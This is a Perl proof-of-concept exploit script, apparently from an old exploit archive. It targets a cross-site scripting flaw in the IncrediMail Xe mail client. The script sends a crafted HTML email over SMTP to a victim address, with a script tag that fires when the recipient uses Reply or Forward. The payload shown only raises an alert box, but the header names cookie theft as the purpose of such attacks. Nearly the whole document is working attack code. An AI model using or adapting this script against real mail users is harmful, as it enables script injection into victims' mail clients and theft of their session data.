#!/usr/bin/perl -w

# IncrediMail Xe (latest version) XSS Vulnerability 
#
# Discovered by :	Bui Quang Minh
#
# Description	:	The most of popular Mail Client now exclude Script Code for mail content. 
#					It aims to avoid the type of XSS exploitation (For e.g: stolen cookie).
#					IncrediMail also remove Script Code when the user read mail. 
#					However, I found the "Reply" and "Forward" function of the mail client 
#					has not handled mail content well resulting in XSS vulnerability.
#
# My Blog	:	http://minhbq.blogspot.com	

use Net::SMTP;

# ARGV Check
if ($#ARGV != 2) 
{
	print "\nUSAGE: IncrediMail.pl <Mail Server> <Attacker Email> <VicTim Email>\n";
	exit;
}

$host = $ARGV[0];
$attacker = $ARGV[1];
$victim = $ARGV[2];

# Config SMTP
$smtp = Net::SMTP->new(	Host => $host,
						Hello => 'Hello world',
						Timeout => 30)
or die "Couldn't connect to Mail Server\n";

# Attacker and Victim email
$smtp->mail($attacker);
$smtp->to($victim);

# Send email
$buffer = "From: XSS Vulnerability\n".
"To: XSS Vulnerability\n".
"Subject: XSS Vulnerability\n".
"MIME-Version: 1.0\n".
"Content-Type: multipart/mixed;\n".
"    boundary=\"--=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\"\n\n".
"----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\n".
"Content-Type: text/html;\n".
"	charset=\"utf-8\"\n".
"Content-Transfer-Encoding: quoted-printable\n\n".
"Reply or Sender for XSS Vulnerability\n".
"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n".
"<HTML><BODY>\n".
"<script> alert('XSS Vulnerability') </script>\n".
"</BODY></HTML>\n\n".
"----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019--";

$smtp->data();
$smtp->datasend($buffer);
$smtp->quit();

print "Send Finish.\n";

# milw0rm.com [2009-03-24]
